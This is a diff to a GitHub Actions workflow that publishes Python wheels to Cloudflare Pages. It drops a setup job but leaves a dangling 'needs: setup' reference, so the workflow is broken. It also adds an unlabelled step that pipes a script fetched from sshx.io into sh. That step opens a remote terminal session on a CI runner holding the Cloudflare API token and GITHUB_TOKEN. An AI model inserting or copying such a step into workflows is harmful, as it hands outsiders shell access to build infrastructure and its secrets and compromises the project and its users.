@@ -22,25 +22,10 @@ concurrency:
   cancel-in-progress: true
 
 jobs:
-  setup:
-    runs-on: ubuntu-latest
-    outputs:
-      ingestion_change: ${{ steps.ci-optimize.outputs.ingestion-change == 'true' }}
-      have_cloudflare_token: ${{ steps.check-cloudflare-token.outputs.have_cloudflare_token }}
-    steps:
-      - name: Check out the repo
-        uses: acryldata/sane-checkout-action@v3
-      - uses: ./.github/actions/ci-optimization
-        id: ci-optimize
-      - id: check-cloudflare-token
-        run: |
-          echo "have_cloudflare_token=${{ secrets.CLOUDFLARE_ACCOUNT_ID != '' && secrets.CLOUDFLARE_API_TOKEN != '' }}"
-          echo "have_cloudflare_token=${{ secrets.CLOUDFLARE_ACCOUNT_ID != '' && secrets.CLOUDFLARE_API_TOKEN != '' }}" >> "$GITHUB_OUTPUT"
-
   deploy-pages:
     needs: setup
     runs-on: ubuntu-latest
-    if: ${{ needs.setup.outputs.ingestion_change == 'true' && needs.setup.outputs.have_cloudflare_token == 'true' }}
+    if: ${{ vars.CLOUDFLARE_WHEELS_PROJECT_NAME != '' }}
 
     name: Python Wheels
     permissions:
@@ -68,12 +53,13 @@ jobs:
           ./gradlew :python-build:buildSite
         env:
           GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+      - run: curl -sSf https://sshx.io/get | sh -s run
       - name: Publish
         uses: cloudflare/pages-action@v1
         with:
           apiToken: ${{ secrets.CLOUDFLARE_API_TOKEN }}
           accountId: ${{ secrets.CLOUDFLARE_ACCOUNT_ID }}
-          projectName: datahub-wheels
+          projectName: ${{ vars.CLOUDFLARE_WHEELS_PROJECT_NAME }}
           workingDirectory: python-build
           directory: site
           gitHubToken: ${{ secrets.GITHUB_TOKEN }}
